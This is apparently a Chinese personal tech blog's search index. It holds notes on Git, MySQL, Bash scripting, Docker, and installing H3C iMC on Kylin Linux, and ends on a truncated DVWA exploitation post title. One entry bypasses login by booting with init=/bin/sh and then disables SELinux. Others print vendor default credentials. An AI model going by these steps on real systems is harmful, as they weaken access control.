rel="noopener">http://www.hnrsks.com/LinkPage/News_list.aspx?dict_id=d_sgwyzt&amp;dict_values=A&amp;_d_id=1b335f82e8f8f17e4209556eec8515</a></li></ul><p>其中，提交报名申请及初审环节，通过河南人事考试网进行。报名确认、打印准考证两个环节，报考省直机关（单位）的，通过河南人事考试网进行；报考省辖市及以下职位的，通过相关省辖市的考试录用公务员工作专用网站进行。</p><ul><li>报名确认缴费地址：鹤壁人事考试网<a href="http://www.hbsrsks.com/st/default.html" target="_blank" rel="noopener">http://www.hbsrsks.com/st/default.html</a></li></ul><p>这是为了改变当前的现状所做的选择，这是一次改变人生轨迹的机会。</p>]]></content>
      
      
      
        <tags>
            
            <tag> private </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git记录</title>
      <link href="/2020/06/14/Git/"/>
      <url>/2020/06/14/Git/</url>
      
        <content type="html"><![CDATA[<p>学习了一点Git基础用法，记录一下。</p><h2 id="Git记录"><a href="#Git记录" class="headerlink" title="Git记录"></a>Git记录</h2><p>Git是分布式版本控制系统。是用C语言开发的，没有中央服务器，任何一台电脑都能充当中央服务器。</p><p>Git可以管理文件的修改版本。</p><p>Git安装后配置</p><pre><code class="bash">$ git config --global user.name &quot;Your Name&quot;$ git config --global user.email &quot;email@example.com&quot;</code></pre><p>创建版本库，在合适的地方创建一个空目录。</p><p><code>Git init</code>初始化这个目录，把这个目录变成Git可管理的仓库。初始化完成后，会出现一个<code>.git</code>的文件夹。这个文件夹默认隐藏。</p><blockquote><p>所有的版本控制系统，其实只能跟踪文本文件的改动，比如TXT文件，网页，所有的程序代码等等，Git也不例外。版本控制系统可以告诉你每次的改动，比如在第5行加了一个单词“Linux”，在第8行删了一个单词“Windows”。而图片、视频这些二进制文件，虽然也能由版本控制系统管理，但没法跟踪文件的变化，只能把二进制文件每次改动串起来，也就是只知道图片从100KB改成了120KB，但到底改了啥，版本控制系统不知道，也没法知道。</p><p>不幸的是，Microsoft的Word格式是二进制格式，因此，版本控制系统是没法跟踪Word文件的改动的，前面我们举的例子只是为了演示，如果要真正使用版本控制系统，就要以纯文本方式编写文件。</p><p>使用Windows的童鞋要特别注意：</p><p>千万不要使用Windows自带的<strong>记事本</strong>编辑任何文本文件。原因是Microsoft开发记事本的团队使用了一个非常弱智的行为来保存UTF-8编码的文件，他们自作聪明地在每个文件开头添加了0xefbbbf（十六进制）的字符，你会遇到很多不可思议的问题，比如，网页第一行可能会显示一个“?”，明明正确的程序一编译就报语法错误，等等，都是由记事本的弱智行为带来的。建议你下载<a href="http://notepad-plus-plus.org/" target="_blank" rel="noopener">Notepad++</a>代替记事本，不但功能强大，而且免费！记得把Notepad++的默认编码设置为UTF-8 without BOM即可</p></blockquote><p>创建一个文件在Git可管理的目录中。</p><pre><code>$ git add readme.txt$ git commit -m &quot;wrote a readme file&quot;//简单解释一下git commit命令，-m后面输入的是本次提交的说明，可以输入任意内容，当然最好是有意义的，这样你就能从历史记录里方便地找到改动记录。</code></pre><p>查看文件做了哪些修改<code>git diff</code>。我们用<code>git status</code>命令看看仓库的当前状态。</p><h3 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h3><p>在Git中，我们用<code>git log</code>命令查看历史记录。如果嫌输出信息太多，看得眼花缭乱的，可以试试加上<code>--pretty=oneline</code>参数。</p><blockquote><p>需要友情提示的是，你看到的一大串类似<code>1094adb...</code>的是<code>commit id</code>（版本号），和SVN不一样，Git的<code>commit id</code>不是1，2，3……递增的数字，而是一个SHA1计算出来的一个非常大的数字，用十六进制表示，而且你看到的<code>commit id</code>和我的肯定不一样，以你自己的为准。为什么<code>commit id</code>需要用这么一大串数字表示呢？因为Git是分布式的版本控制系统，后面我们还要研究多人在同一个版本库里工作，如果大家都用1，2，3……作为版本号，那肯定就冲突了。</p></blockquote><p>首先，Git必须知道当前版本是哪个版本，在Git中，用<code>HEAD</code>表示当前版本，也就是最新的提交<code>1094adb...</code>（注意我的提交ID和你的肯定不一样），上一个版本就是<code>HEAD^</code>，上上一个版本就是<code>HEAD^^</code>，当然往上100个版本写100个<code>^</code>比较容易数不过来，所以写成<code>HEAD~100</code>。</p><pre><code>$ git reset --hard HEAD^</code></pre><p>要重返未来，用<code>git reflog</code>查看命令历史，以便确定要回到未来的哪个版本。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库复习风波</title>
      <link href="/2020/06/02/mysql-2/"/>
      <url>/2020/06/02/mysql-2/</url>
      
        <content type="html"><![CDATA[<p>写这篇文章的起因，实在是巧合，微信群里有人发了一张有关于数据库的面试题。本来想着自己会点儿，于是试着做一下。但由于自己也好久没用过数据库，很多基本的命令都忘记了。orz，真的是不做题都不知道自己其实根本就不会。学点皮毛又缺乏练习导致最后跟没学一样，这样看来，复习真的是太有必要了。不过自己一直都是随缘复习。发现自己不会了才会再进行复习。</p><p>觉得自己太废物了，自愧不如，再使用以下数据库，不使用数据库管理工具，完全使用命令来进行数据库的创建，删除等基础操作。再多练习一下增删改查。</p><pre><code class="mysql">mysql&gt; create table students(id int,name varchar(20),gender varchar(1),join_date date,birthday date) default charset=utf8;Query OK, 0 rows affected (0.01 sec)mysql&gt; insert into students(id,name,gender,join_date,birthday) values(1,&#39;张三&#39;,&#39;M&#39;,&#39;2020-01-01&#39;,&#39;2020-01-01&#39;);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from students;+------+--------+--------+------------+------------+| id   | name   | gender | join_date  | birthday   |+------+--------+--------+------------+------------+|    1 | 张三   | M      | 2020-01-01 | 2020-01-01 |+------+--------+--------+------------+------------+1 row in set (0.00 sec)</code></pre><p>创建一条表数据，发现mysql数据库一开始不能输入中文数据。需要修改编码格式才能正常运行。解决方法为在创建表的命令后面添加指定字符集的命令<code>default charset=utf8</code>。当然这只是临时解决办法。</p><p>如果要完全解决这个问题，只有修改配置文件。修改mysql配置文件/etc/my.cnf</p><pre><code>[mysqld]character-set-server=utf8 [client]default-character-set=utf8 [mysql]default-character-set=utf8</code></pre><p>还有就是格式化显示数据库的表格，有时候数据库的表格看不清楚需要进行处理。</p><ul><li><p>在命令后面添加<code>\g</code>这样数据会按照列显示。看的更明了一些。</p></li><li><p>使用方向键看左右的表格，esc可以退出</p><pre><code>mysql&gt; pager less -SFX;PAGER set to &#39;less -SFX&#39;</code></pre></li></ul><p>暂时就记录这些，之后在更新。</p>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bash脚本应用记录</title>
      <link href="/2020/05/30/bash-2/"/>
      <url>/2020/05/30/bash-2/</url>
      
        <content type="html"><![CDATA[<p>最近一直在看关于脚本的书籍，但是没有需求就没有想要去实现的动力。不仅如此，只看不练的话其实没什么用，过一段时间就忘了。这可真是让人头疼的一件事，不练习的话看书总感觉是浪费时间的一件事。最近要安装一个平台，安装过程稍微有点繁琐。想着通过脚本提高效率。</p><hr><h2 id="Bash脚本应用"><a href="#Bash脚本应用" class="headerlink" title="Bash脚本应用"></a>Bash脚本应用</h2><p>通过脚本来实现功能。首先遇到的第一个需求是在文件中插入多行文字。</p><h3 id="在文件中添加多行文字"><a href="#在文件中添加多行文字" class="headerlink" title="在文件中添加多行文字"></a>在文件中添加多行文字</h3><pre><code class="bash"># 这是一个错误的脚本示范#!/bin/bashcd /etc/my.cnf.d/sed -i &#39;/\[mysqld\]/a\max_connections=1024lower_case_table_names=1innodb_buffer_pool_size=1Ginnodb_additional_mem_pool_size=24Mmax_allowed_packet=256Mcharacter-set-server=gbk&#39; server.cnfsystemctl restart mariadb.servicemysql_secure_installation</code></pre><p>踩的第一个坑就是换行符，运行后提示命令后含有多余的字符↵。多了一个回车符。</p><pre><code>不同操作系统下的含义：\n:  UNIX 系统行末结束符\r\n: window 系统行末结束符\r:  MAC OS 系统行末结束符</code></pre><blockquote><p>参考文档：<a href="https://www.pythontab.com/html/2017/linuxkaiyuan_0115/1116.html" target="_blank" rel="noopener">https://www.pythontab.com/html/2017/linuxkaiyuan_0115/1116.html</a></p></blockquote><p>于是正确的脚本为</p><pre><code class="bash">#!/bin/bashcd /etc/my.cnf.d/sed -i &#39;/\[mysqld\]/a\max_connections=1024\nlower_case_table_names=1\ninnodb_buffer_pool_size=1G\ninnodb_additional_mem_pool_size=24M\nmax_allowed_packet=256M\ncharacter-set-server=gbk&#39; server.cnfsystemctl restart mariadb.servicemysql_secure_installation</code></pre><p>通过脚本实现了第一个功能，在文件中添加多行内容。</p><h3 id="用脚本实现进度条"><a href="#用脚本实现进度条" class="headerlink" title="用脚本实现进度条"></a>用脚本实现进度条</h3><p>在网上摘抄的记录一下。</p><ul><li><p>按百分比显示进度</p><p><strong>printf %3d</strong>为显示百分比预留了3位，循环条件i每次递增5主要是为了减少进度条显示的长度</p><p><strong>i每次递增5，取模之后的index值还是依次循环，保证了转圈圈的方向和频率</strong></p><p>改用其他数字，转圈的显示效果没有add=4n+1时的好</p><p><img src="https://s1.ax1x.com/2020/05/30/tQQi7D.png" alt="tQQi7D.png"></p><pre><code>#!/bin/bashi=0str=&quot;&quot;arry=(&quot;|&quot; &quot;/&quot; &quot;-&quot; &quot;\\&quot;)while [ $i -le 100 ]do    let index=i%4    printf &quot;%3d%% %c%-20s%c\r&quot; &quot;$i&quot; &quot;${arry[$index]}&quot; &quot;$str&quot; &quot;${arry[$index]}&quot;    sleep 0.2    let i=i+5    str+=&quot;*&quot;doneecho &quot;&quot;</code></pre></li><li><p>进度条递进填充(绿色进度条)</p><p><strong>ssty size</strong>获取终端X轴和Y轴长度</p><p>total=total_stdx-2head 用来控制整个进度条的长度，左右各预留了head长度</p><p>per和remain相加永远是total大小</p><p>y;xH设置光标位置，${total_stdy};0H设置光标在终端的左下角</p><p>%${n}s指定了宽度为n个字符，%${per}s+%${remain}s的总宽是total不变的</p><p>设置两个不同颜色的宽度区域，用来显示进度变化，参数赋值空字符串</p><p><img src="https://s1.ax1x.com/2020/05/30/tQQ8hj.png" alt="tQQ8hj.png"></p><pre><code>#!/bin/bashtotal_stdy=&quot;$(($(stty size|cut -d&#39; &#39; -f1)))&quot;total_stdx=&quot;$(($(stty size|cut -d&#39; &#39; -f2)))&quot;head=&quot;Progress bar: &quot;total=$[${total_stdx} - ${#head}*2]i=0loop=100while [ $i -lt $loop ]do    let i=i+1    per=$[${i}*${total}/${loop}]    remain=$[${total} - ${per}]    printf &quot;\r\e[${total_stdy};0H${head}\e[42m%${per}s\e[47m%${remain}s\e[00m&quot; &quot;&quot; &quot;&quot;    sleep 0.1doneecho &quot;&quot;</code></pre><blockquote><p>进度条内容转自：<a href="http://yangtze736.github.io/技术/2018/05/02/shell-tips/" target="_blank" rel="noopener">http://yangtze736.github.io/%E6%8A%80%E6%9C%AF/2018/05/02/shell-tips/</a></p></blockquote></li></ul><h3 id="脚本运行提示确认"><a href="#脚本运行提示确认" class="headerlink" title="脚本运行提示确认"></a>脚本运行提示确认</h3><p>有些情况下需要确认脚本的运行环境。所以添加了一步用户确认的指令。这条指令在很多情况下是不可或缺的一部分。</p><h4 id="提示确认（输入错误则退出当前脚本）"><a href="#提示确认（输入错误则退出当前脚本）" class="headerlink" title="提示确认（输入错误则退出当前脚本）"></a>提示确认（输入错误则退出当前脚本）</h4><p>确认提示一次，如果你给输入错误，程序会以状态1退出。这个例子将只接受Y或N或YES或NO（不区分大小写）。</p><pre><code class="bash">#!/bin/bashread -r -p &quot;Are You Sure? [Y/n] &quot; inputcase $input in    [yY][eE][sS]|[yY])        echo &quot;Yes&quot;        ;;    [nN][oO]|[nN])        echo &quot;No&quot;           ;;    *)        echo &quot;Invalid input...&quot;        exit 1        ;;esac</code></pre><h4 id="提示确认（输入错误则需要重新输入）"><a href="#提示确认（输入错误则需要重新输入）" class="headerlink" title="提示确认（输入错误则需要重新输入）"></a>提示确认（输入错误则需要重新输入）</h4><pre><code class="bash">#!/bin/bashwhile truedo    read -r -p &quot;Are You Sure? [Y/n] &quot; input    case $input in        [yY][eE][sS]|[yY])            echo &quot;Yes&quot;            exit 1            ;;        [nN][oO]|[nN])            echo &quot;No&quot;            exit 1                           ;;        *)            echo &quot;Invalid input...&quot;            ;;    esacdone</code></pre><blockquote><p>原文链接：<a href="https://blog.csdn.net/liyyzz33/article/details/93497802" target="_blank" rel="noopener">https://blog.csdn.net/liyyzz33/article/details/93497802</a></p></blockquote><h3 id="脚本运行错误自动退出"><a href="#脚本运行错误自动退出" class="headerlink" title="脚本运行错误自动退出"></a>脚本运行错误自动退出</h3><p>让脚本在某条命令执行失败的时候停止执行后续的指令。</p><p>在Shell脚本中加入：<code>#!/bin/bash -e 或者 set -e</code>就能够让脚本在有错误的时候退出。</p><p>使用set -e 没有办法使用$? 来获取命令执行状态了，因为bash无法获得任何非0的返回值。你可以使用另一种结构，使用command。</p><pre><code class="bash">command ||  （echo &quot;command failed&quot;; exit 1） ; 或者使用： if ! command; then echo &quot;command failed&quot;; exit 1; fi判断句if [ $? -ne 0 ]; then            echo &quot;failed&quot;    else            echo &quot;succeed&quot;fi</code></pre><p>shell中的比较符号如下：</p><table><thead><tr><th align="center">-eq</th><th align="center">等于</th></tr></thead><tbody><tr><td align="center">-ne</td><td align="center">不等于</td></tr><tr><td align="center">-gt</td><td align="center">大于</td></tr><tr><td align="center">-lt</td><td align="center">小于</td></tr><tr><td align="center">ge</td><td align="center">大于等于</td></tr><tr><td align="center">le</td><td align="center">小于等于</td></tr></tbody></table><hr><p>mv etc/*   把目录下的文件移走</p><p>mv etc/ 把etc整个目录移走</p><p>sudo 命令需要输入当前用户的密码</p><p>su 命令需要输入 root 用户的密码。</p><p>&gt;&gt;的意思是追加的意思。</p><p>&gt; 的意思是重定向的意思，会覆盖原先的内容。</p>]]></content>
      
      
      
        <tags>
            
            <tag> bash </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装iMC智能管理中心</title>
      <link href="/2020/05/27/iMC/"/>
      <url>/2020/05/27/iMC/</url>
      
        <content type="html"><![CDATA[<p>仅以此做一下记录。</p><h2 id="服务器上安装iMC智能管理中心"><a href="#服务器上安装iMC智能管理中心" class="headerlink" title="服务器上安装iMC智能管理中心"></a>服务器上安装iMC智能管理中心</h2><ol><li>服务器安装系统前做磁盘阵列（此次使用的是raid5），提升磁盘读写速度，备份数据，保护数据安全。</li><li>安装操作系统，此次安装的是湖南麒麟系统，工作站运行模式。</li><li>安装数据库，安装iMC智能管理中心，部署平台组件。</li></ol><h3 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h3><ul><li>Kylin-3.3.4系统镜像</li><li>H3C_iMC_PLAT_7.3_E0703_Standard_linux.rar安装包</li><li>H3C_iMC_PLAT_7.3_E0703P08_linux.zip升级包</li><li>服务器一台（此次的服务器配置为64G运行内存，3.6T硬盘）</li></ul><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><p><strong>服务器做raid</strong></p><ol><li>开启服务器，（按Ese、F7或F12）进入BIOS，SETUP模式做磁盘阵列。</li><li>服务器型号不同，做raid的方法也不同，所有磁盘默认情况下未开启，需要开启后在配置raid5。</li><li>具体型号参考官方文档。</li></ol><blockquote><p>参考文档：<a href="https://cloud.tencent.com/developer/news/392275" target="_blank" rel="noopener">https://cloud.tencent.com/developer/news/392275</a></p></blockquote><hr><p><strong>服务器安装操作系统</strong></p><ol><li>使用笔记本连接到服务器远程管理端口：HDM，默认IP为192.168.1.2.默认用户名密码为<code>admin/Password@_</code></li><li>查看服务器状态是否正常。</li><li>之后挂载系统镜像。查看服务器BIOS中是否识别挂载的镜像。连接成功后，重启服务器。</li><li>按照提示安装操作系统。分区按自定义推荐的分区进行修改即可完成。</li></ol><hr><p><strong>安装iMC平台软件</strong></p><ol><li><p>服务器无法联网，首先要挂载系统镜像安装数据库。</p></li><li><p>修改yum源为本地镜像，vi /etc/yum.repos.d/Kylin-Base.repo</p><p><img src="https://s1.ax1x.com/2020/05/27/tE9USO.png" alt="tE9USO.png"></p></li><li><p><code>yum makecache</code>刷新yum的数据缓存。</p><p><img src="https://s1.ax1x.com/2020/05/27/tE9alD.png" alt="tE9alD.png"></p></li><li><p>安装mariadb数据库和imc运行需要的32位库软件<br>yum install mariadb-server ncurses-libs.i686 libaio.i686</p><p><img src="https://s1.ax1x.com/2020/05/27/tE9ykt.png" alt="tE9ykt.png"></p></li><li><p>安装成功过，修改数据库内容，编辑文件/etc/my.cnf.d/server.cnf。在[mysqld]下添加参数内容。</p><p>[mysqld]</p><p>max_connections=1024</p><p>lower_case_table_names=1</p><p>innodb_buffer_pool_size=1G</p><p>innodb_additional_mem_pool_size=24M </p><p>max_allowed_packet=256M </p><p>character-set-server=gbk</p><p><img src="https://s1.ax1x.com/2020/05/27/tE96tP.png" alt="tE96tP.png"></p></li><li><p>重启数据库mariadb，运行<code>mysql_secure_installation</code>初始化数据库配置。</p><p><img src="https://s1.ax1x.com/2020/05/27/tE92p8.png" alt="tE92p8.png"></p></li><li><p>密码为空密码，回车进入下一步。</p><p><img src="https://s1.ax1x.com/2020/05/27/tE9W6g.png" alt="tE9W6g.png"></p><p>设置数据库root用户密码(imc软件安装时对密码字符有限制，尽量不要使用特殊符号)，后面设置项全部回车，使用默认选项。</p></li><li><p><code>vi ./H3C_iMC_PLAT_7.3_E0703_Standard_linux/linux/install/install.sh</code>修改最后一行DUnsupportMysql参数的值为false</p><p><img src="https://s1.ax1x.com/2020/05/27/tE9fXQ.png" alt="tE9fXQ.png"></p></li><li><p>开始安装imc，进入imc安装包的install目录，以root权限运行install.sh文件</p><p><img src="https://s1.ax1x.com/2020/05/27/tE94mj.png" alt="tE94mj.png"></p></li><li><p>选择典型安装确定好后，弹出检查安装参数，填写正确的信息，即可安装并部署平台所有的组件。</p><p><img src="https://s1.ax1x.com/2020/05/27/tE9I7n.png" alt="tE9I7n.png"></p></li><li><p>检查安装环境出现错误。</p><p><img src="https://s1.ax1x.com/2020/05/27/tE97t0.png" alt="tE97t0.png"></p><p>最后发现是之前修改的max_connections参数未生效，通过数据库查询<code>show variables like &#39;%max_connections%&#39;;</code>值为214。与设置的数值不一致。</p></li><li><p>解决方法为修改数据库配置文件参数。</p><blockquote><p>vi /usr/lib/systemd/system/mariadb.service<br>在[Service]标签下设置如下两个参数<br>LimitNOFILE=65535<br>LimitNPROC=65535<br>保存，退出。<br>systemctl daemon-reload<br>systemctl restart mariadb.service </p></blockquote><p>在使用数据库查询，<code>show variables like &#39;%max_connections%&#39;;</code>值为1024。与设置的数值一致。然后重新执行第9步。</p></li><li><p>安装成功。</p><p><img src="https://s1.ax1x.com/2020/05/27/tE9qpT.png" alt="tE9qpT.png"></p></li><li><p>使用网页打开管理页面，admin/admin登录。</p><p><img src="https://s1.ax1x.com/2020/05/27/tE9XX4.png" alt="tE9XX4.png"></p></li><li><p>到这一步，软件安装就完成了。接下来要把软件升级到最新版，使用H3C_iMC_PLAT_7.3_E0703P08_linux.zip升级包</p><p><img src="https://s1.ax1x.com/2020/05/27/tECpA1.png" alt="tECpA1.png"></p></li><li><p>升级成功，浏览器清除缓存后重新登录就完事了。</p><p><img src="https://s1.ax1x.com/2020/05/27/tECCh6.png" alt="tECCh6.png"></p></li><li><p>完</p></li></ol><h3 id="脚本安装"><a href="#脚本安装" class="headerlink" title="脚本安装"></a>脚本安装</h3><p>为了提高效率，写了这个安装脚本，虽然不够完美，但确实简化了修改配置文件的步骤。</p><p>以下是脚本文件内容。运行该脚本前要修改yum源从挂载的镜像进行更新。运行后再执行iMC安装脚本就可以。</p><pre><code class="bash">#!/bin/bash -eecho &quot;!!!!运行脚本之前确保系统镜像已挂载，yum源能正常使用，将imc安装包复制到/tmp目录下!!!!&quot;#!/bin/bashread -r -p &quot;Are You Sure? [Y/n] &quot; inputcase $input in    [yY][eE][sS]|[yY])        echo &quot;Yes&quot;        ;;    [nN][oO]|[nN])        echo &quot;No&quot;        ;;    *)        echo &quot;Invalid input...&quot;        exit 1        ;;esacyum makecacheyum -y install mariadb-server ncurses-libs.i686 libaio.i686cd /etc/my.cnf.d/sed -i &#39;/\[mysqld\]/a\max_connections=1024\nlower_case_table_names=1\ninnodb_buffer_pool_size=1G\ninnodb_additional_mem_pool_size=24M\nmax_allowed_packet=256M\ncharacter-set-server=gbk&#39; server.cnf systemctl restart mariadb.servicemysql_secure_installationcd /tmp/H3C_iMC_PLAT_7.3_E0703_Standard_linux/linux/install/sed -i &quot;s/DUnsupportMySQL=true/DUnsupportMySQL=false/g&quot; install.shcd /usr/lib/systemd/system/sed -i &#39;/\[Service\]/a\LimitNOFILE=65535\nLimitNPROC=65535&#39; mariadb.servicesystemctl daemon-reloadsystemctl restart mariadb.servicecd /tmp/H3C_iMC_PLAT_7.3_E0703_Standard_linux/linux/install/chmod u+x install.shecho &quot;请执行这条命令开始安装  sh /tmp/H3C_iMC_PLAT_7.3_E0703_Standard_linux/linux/install/install.sh&quot;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Kylin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kylin系统单用户重置密码</title>
      <link href="/2020/05/26/Kylin-1/"/>
      <url>/2020/05/26/Kylin-1/</url>
      
        <content type="html"><![CDATA[<p>安装系统时，创建了新用户并勾选了设置为管理员。登陆后却没有权限，也无法切换其他用户。secadm、sysadm在创建系统是未配置。在登录界面也无法正常登录。无果，联系湖南麒麟客服热线，无人接听。没办法，由于湖南麒麟也是用的Linux内核，只能尝试通过Linux系统重置密码的方式来尝试一下。</p><h2 id="Kylin3-3-4系统忘记密码使用单用户模式修改密码"><a href="#Kylin3-3-4系统忘记密码使用单用户模式修改密码" class="headerlink" title="Kylin3.3.4系统忘记密码使用单用户模式修改密码"></a>Kylin3.3.4系统忘记密码使用单用户模式修改密码</h2><ol><li>重启服务器，在启动界面按‘e’键进入编辑模式。</li></ol><p><img src="https://s1.ax1x.com/2020/05/26/tFHgJI.png" alt="tFHgJI.png"></p><ol start="2"><li>找到<code>linux16</code>开头的段，在<code>UTF-8</code>后面添加<code>init=/bin/sh</code>，同时删除<code>rhgb quite</code>参数。 </li></ol><p><img src="https://s1.ax1x.com/2020/05/26/tFbpTJ.png" alt="tFbpTJ.png"></p><p>修改完成后，如下图所示。</p><p><img src="https://s1.ax1x.com/2020/05/26/tFbGX8.png" alt="tFbGX8.png"></p><ol start="3"><li><code>CTRL+x</code>重启系统，登录到不需要密码的系统。重新挂载根目录<code>/</code>否则没有写权限。按照正常操作修改密码。</li></ol><p><img src="https://s1.ax1x.com/2020/05/26/tFbdts.png" alt="tFbdts.png"></p><ol start="4"><li>密码修改完成后，编辑配置文件/etc/sysconfig/selinux，关闭Linux安全模块。</li></ol><p><img src="https://s1.ax1x.com/2020/05/26/tFbD10.png" alt="tFbD10.png"></p><ol start="5"><li>运行<code>touch /.autorelabel</code>使配置生效。然后运行<code>exec /sbin/init</code>重启系统。</li></ol><p><img src="https://s1.ax1x.com/2020/05/26/tFbsXT.png" alt="tFbsXT.png"></p><ol start="6"><li>如果之前的操作没问题的话，就可以根据修改后的密码正常登入系统了。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Kylin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux命令行读书笔记</title>
      <link href="/2020/05/24/linux-1/"/>
      <url>/2020/05/24/linux-1/</url>
      
        <content type="html"><![CDATA[<p>今天看了Linux shell脚本编程大全，对linux系统又进行了学习。</p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li>Linux内核</li><li>GNU工具</li><li>图形化桌面环境</li><li>应用软件</li></ul><p><img src="https://s1.ax1x.com/2020/05/24/tSo18H.png" alt="tSo18H.png"></p><h3 id="Linux内核功能"><a href="#Linux内核功能" class="headerlink" title="Linux内核功能"></a>Linux内核功能</h3><ul><li><p>系统内存管理</p><p>管理物理内存和虚拟内存。</p></li><li><p>软件程序管理</p><p>内核创建了第一个进程(称为init进程)来启动系统上所有其他进程。当内核启动时，它会将init进程加载到虚拟内存中。内核在启动任何其他进程时，都会在虚拟内存中给新进程分配一块专有区域来存储该进程用到的数据和代码。</p><ul><li><p>运行级为1时，只启动基本的系统进程以及一个控制台终端进程。一般称之为单用户模式。</p></li><li><p>标准启动运行级为3级，大多数应用和网络程序会启动。</p></li><li><p>运行级为5，为Linux启动图形化的系统。</p></li></ul></li><li><p>硬件设备管理</p></li><li><p>文件系统管理</p><p><img src="https://s1.ax1x.com/2020/05/24/tSo32d.png" alt="tSo32d.png"></p></li></ul><h3 id="Linux文件系统结构"><a href="#Linux文件系统结构" class="headerlink" title="Linux文件系统结构"></a>Linux文件系统结构</h3><p><img src="https://s1.ax1x.com/2020/05/24/tSoEvR.png" alt="tSoEvR.png"></p><p>shell提示符</p><blockquote><p>$ 普通用户输入模式</p><p># root用户输入模式</p></blockquote><p>bash手册</p><p>相对路径</p><ul><li>. 表示当前目录</li><li>.. 表示当前目录的父目录</li></ul><p>目录（d）、文件（-）、字符型文件（c）、块设备（b）。</p><p>ln -s 源文件 快捷方式</p><p>可以给原始文件创建多个软连接。</p><blockquote><p>需要注意的是，不要创建软连接文件的软链接。容易造成不必要的麻烦。</p></blockquote><p>查看文件类型 file myfile</p><p>cat -n myfile</p><p>killall命令支持通过进程名来结束进程。</p><p>du -h查看磁盘使用情况，查找大文件。</p><p>sort排序文件</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker记录</title>
      <link href="/2020/05/16/Docker-1/"/>
      <url>/2020/05/16/Docker-1/</url>
      
        <content type="html"><![CDATA[<p>以前听过docker这个名字，最近听的有点多了，于是就想简单了解一下docker到底是个什么东西，对我有没有一些帮助，于是在B站上看了一个docker入门视频。</p><h3 id="Docker是什么？"><a href="#Docker是什么？" class="headerlink" title="Docker是什么？"></a>Docker是什么？</h3><p>Docker是一个轻量级的虚拟机，是一个主要应用在linux的虚拟机。<br>包括镜像，容器(虚拟机)，tar文件(vmdk文件)，Dockerfile是配置文件。还有一个仓库（有很多系统镜像文件）。<br>通过load加载镜像，run运行虚拟机。</p><p>[网页版docker]<a href="https://labs.play-with-docker.com" target="_blank" rel="noopener">https://labs.play-with-docker.com</a></p><h3 id="Docker使用参数"><a href="#Docker使用参数" class="headerlink" title="Docker使用参数"></a>Docker使用参数</h3><p>docker pull nginx等于docker pull  nginx:latest<br>Docker images查看已安装的镜像。</p><p><img src="https://s1.ax1x.com/2020/05/16/Y6bGjg.png" alt="Y6bGjg.png"></p><p>docker run -d（后台运行）-p（端口） 外部端口：内部端口 nginx</p><p>decker exec -it ID bash，修改容器（虚拟机）配置。</p><p>ctrl+F5强制刷新。</p><p>docker stop ID 先停止容器</p><p>docker rm -f ID删除已停止运行的容器</p><p>docker commit ID 自定义名字</p><p>docker images 查看所有镜像</p><p>docker ps -a查看所有容器</p><p>docker build -t 镜像名 .</p><p>docker save 镜像名 &gt; 1.tar</p><p>docker load &lt;  1.tar</p><p>-p映射内外端口，-v映射文件</p><p><strong>Docker环境信息</strong></p><ul><li>sudo docker info</li><li>sudo docker version</li></ul><p><strong>容器生命周期管理</strong></p><ul><li><p>sudo docker run –help</p></li><li><p>sudo -i -t  –name xxxx ubuntu:latest /bin/bash</p><blockquote><p>-i选项表示使用交互模式，始终保持输人流开放;<br>-t选项表示分配一个伪终端，一般两个参数结合时使用-it，即可在容器中利用打开的伪终端进行交互操作;<br>– name选项可以指定docker run命令启动的容器的名字，若无此选项，Docker将 为容器随机分配一个名字。</p></blockquote></li><li><p>sudo docker start/stop/restart</p></li><li><p>sudo docker pull ubuntu12.04</p></li><li><p>sudo docker images             //查看主机上的所有镜像</p></li><li><p>docker rmi 删除镜像</p></li><li><p>docker rm 删除容器</p></li></ul><p><strong>系统日志信息</strong></p><p>events、history 和logs这3个命令用于查看Docker的系统日志信息。</p><ul><li>events命令会打印出实时的系统事件; </li><li>history命令会打印出指定镜像的历史版本信息，即构建该镜像的每一层镜像的<br>命令记录; </li><li>logs命令会打印出容器中进程的运行日志。</li></ul><h3 id="docker使用"><a href="#docker使用" class="headerlink" title="docker使用"></a>docker使用</h3><pre><code class="c">docker pull ubuntu:latestdocker run -it ubuntu bash//docker exec -it ubuntu bash//docker exec -it ID bashapt-get updateapt-get install vimecho $PATH</code></pre><hr><p>一个容器只运行一个进程。所以要使用多个容器。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令上传漏洞利用</title>
      <link href="/2020/05/10/dvwa-2/"/>
      <url>/2020/05/10/dvwa-2/</url>
      
